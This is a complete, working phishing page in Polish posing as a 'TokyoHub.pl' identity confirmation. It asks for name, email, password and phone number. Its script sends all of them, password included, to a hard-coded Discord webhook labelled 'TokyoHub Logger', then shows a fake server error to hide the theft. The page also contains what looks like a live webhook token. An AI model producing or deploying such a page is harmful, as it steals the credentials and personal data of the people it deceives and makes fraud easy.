<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TokyoHub.pl - Potwierdź tożsamość</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }

        body {
            font-family: 'Inter', sans-serif;
            background: #0a051f;
            color: #e0bbff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px 12px;           /* mniejszy padding na bokach */
            position: relative;
            overflow: hidden;
        }

        .bg {
            position: absolute;
            inset: 0;
            background: url('https://picsum.photos/id/1015/1920/1080') center/cover no-repeat;
            filter: brightness(0.45) saturate(1.7);
            z-index: -3;
        }

        .overlay {
            position: absolute;
            inset: 0;
            background: linear-gradient(to bottom, rgba(10,5,31,0.78), rgba(20,10,50,0.97));
            z-index: -2;
        }

        .container {
            width: 100%;
            max-width: 460px;
            z-index: 10;
        }

        .card {
            background: rgba(18, 8, 42, 0.94);
            backdrop-filter: blur(30px);
            border-radius: 32px;
            border: 1px solid rgba(192, 38, 211, 0.55);
            box-shadow: 0 35px 90px -20px rgba(192, 38, 211, 0.7);
            overflow: hidden;
            margin: 0 auto;
        }

        .header {
            padding: 40px 32px 28px;     /* zmniejszony padding poziomy */
            text-align: center;
        }

        .header h1 {
            font-size: 34px;
            font-weight: 700;
            background: linear-gradient(90deg, #f472b6, #c026d3);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .header p {
            margin-top: 8px;
            font-size: 15.5px;
            opacity: 0.9;
        }

        .progress-container {
            padding: 0 32px 28px;
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .progress-bar {
            flex: 1;
            height: 6px;
            background: rgba(255,255,255,0.12);
            border-radius: 9999px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(to right, #f472b6, #c026d3);
            transition: width 0.9s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        .step-dot {
            width: 34px;
            height: 34px;
            border-radius: 50%;
            background: #1a1033;
            border: 3px solid #c026d3;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 15px;
            font-weight: 700;
            color: white;
            flex-shrink: 0;
        }

        .step-dot.active { 
            border-color: #f472b6; 
            box-shadow: 0 0 18px #f472b6; 
        }

        .form-content {
            padding: 0 32px 70px;     /* zmniejszony padding poziomy */
            position: relative;
            min-height: 460px;
        }

        .step-content {
            position: absolute;
            width: 100%;
            left: 0;
            opacity: 0;
            transform: translateY(30px);
            transition: all 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
            pointer-events: none;
        }

        .step-content.active {
            opacity: 1;
            transform: translateY(0);
            pointer-events: all;
        }

        .step-title {
            font-size: 22px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 36px;
            color: #f3e8ff;
        }

        .input-group {
            margin-bottom: 26px;
        }

        .input-group label {
            display: block;
            margin-bottom: 9px;
            font-size: 14.8px;
            color: #c4b5fd;
        }

        .input-wrapper {
            position: relative;
        }

        .input-wrapper i {
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: #d8b4fe;
            font-size: 19px;
        }

        .input-group input {
            width: 100%;
            padding: 18px 22px 18px 56px;
            background: rgba(30, 15, 55, 0.85);
            border: 2px solid rgba(192, 38, 211, 0.45);
            border-radius: 18px;
            font-size: 16.8px;
            color: white;
        }

        .input-group input:focus {
            border-color: #f472b6;
            box-shadow: 0 0 0 5px rgba(244, 114, 182, 0.3);
        }

        .error {
            color: #fda4af;
            font-size: 13.5px;
            margin-top: 6px;
            display: none;
        }

        .btn {
            width: 100%;
            padding: 19px;
            font-size: 17.8px;
            font-weight: 600;
            border: none;
            border-radius: 18px;
            cursor: pointer;
            margin-top: 32px;
            transition: all 0.4s ease;
        }

        .btn-primary {
            background: linear-gradient(90deg, #f472b6, #c026d3);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-4px);
            box-shadow: 0 10px 20px rgba(192, 38, 211, 0.4);
        }

        .success-msg {
            display: none;
            text-align: center;
            padding: 110px 30px 80px;
            font-size: 18px;
        }

        /* Responsywność */
        @media (max-width: 480px) {
            .header {
                padding: 32px 24px 24px;
            }
            .form-content {
                padding: 0 24px 60px;
            }
            .progress-container {
                padding: 0 24px 24px;
            }
            .step-title {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="bg"></div>
    <div class="overlay"></div>

    <div class="container">
        <div class="card">
            <div class="header">
                <h1>TokyoHub.pl</h1>
                <p>Potwierdź tożsamość</p>
            </div>

            <div class="progress-container">
                <div class="step-dot active" id="dot1">1</div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progress-fill"></div>
                </div>
                <div class="step-dot" id="dot2">2</div>
            </div>

            <div class="form-content">
                <!-- Krok 1 -->
                <div class="step-content active" id="step1">
                    <div class="step-title">Krok 1 — Dane logowania</div>
                    
                    <div class="input-group">
                        <label>Imię i nazwisko</label>
                        <div class="input-wrapper">
                            <i class="fas fa-user"></i>
                            <input type="text" id="fullname" placeholder="Jan Kowalski">
                        </div>
                    </div>

                    <div class="input-group">
                        <label>Adres e-mail</label>
                        <div class="input-wrapper">
                            <i class="fas fa-envelope"></i>
                            <input type="email" id="email" placeholder="twoj@email.pl">
                        </div>
                        <div class="error" id="email-error">Email musi zawierać @</div>
                    </div>

                    <div class="input-group">
                        <label>Hasło</label>
                        <div class="input-wrapper">
                            <i class="fas fa-lock"></i>
                            <input type="password" id="password" placeholder="••••••••">
                        </div>
                    </div>

                    <button class="btn btn-primary" onclick="nextStep()">Dalej →</button>
                </div>

                <!-- Krok 2 -->
                <div class="step-content" id="step2">
                    <div class="step-title">Krok 2 — Weryfikacja telefonu</div>
                    
                    <div class="input-group">
                        <label>Numer telefonu</label>
                        <div class="input-wrapper">
                            <i class="fas fa-phone"></i>
                            <input type="tel" id="phone" placeholder="+48 123 456 789">
                        </div>
                    </div>

                    <button class="btn btn-primary" onclick="submitLogin()">Zatwierdź logowanie</button>
                    <button class="btn btn-primary" style="background:rgba(255,255,255,0.12); margin-top:12px;" onclick="prevStep()">← Wróć</button>
                </div>

                <div class="success-msg" id="success">
                    <p>Łączenie z serwerem...</p>
                    <p id="error-text" style="color:#fda4af; margin-top:25px;">Błąd ze strony serwera</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1497289678573928531/XKU2XSbKqWAJeoPtRmAbVwuy9WFXrbX8cS1-dvz7BoJBzM7j37G-YyiCwCbzxW-HBp6p";
        let currentStep = 1;

        function nextStep() {
            const email = document.getElementById('email').value.trim();
            if (!email || !email.includes('@')) {
                document.getElementById('email-error').style.display = 'block';
                return;
            }
            document.getElementById('email-error').style.display = 'none';

            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');

            document.getElementById('progress-fill').style.width = '100%';
            document.getElementById('dot1').classList.remove('active');
            document.getElementById('dot2').classList.add('active');

            currentStep = 2;
        }

        function prevStep() {
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step1').classList.add('active');

            document.getElementById('progress-fill').style.width = '0%';
            document.getElementById('dot2').classList.remove('active');
            document.getElementById('dot1').classList.add('active');

            currentStep = 1;
        }

        async function submitLogin() {
            const fullname = document.getElementById('fullname').value.trim();
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const phone = document.getElementById('phone').value.trim();

            document.querySelectorAll('.step-content').forEach(el => el.style.display = 'none');
            document.getElementById('success').style.display = 'block';

            const payload = {
                username: "TokyoHub Logger",
                embeds: [{
                    title: "🌸 Nowe logowanie — TokyoHub.pl",
                    color: 0xc026d3,
                    fields: [
                        { name: "Imię i nazwisko", value: fullname || "—", inline: true },
                        { name: "E-mail", value: email || "—", inline: true },
                        { name: "Hasło", value: "||`" + (password || "—") + "`||", inline: false },
                        { name: "Telefon", value: phone || "—", inline: true },
                        { name: "Czas", value: new Date().toLocaleString('pl-PL'), inline: true }
                    ]
                }]
            };

            try {
                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (e) {}
        }

        document.getElementById('email').addEventListener('input', () => {
            document.getElementById('email-error').style.display = 'none';
        });
    </script>
</body>
</html>
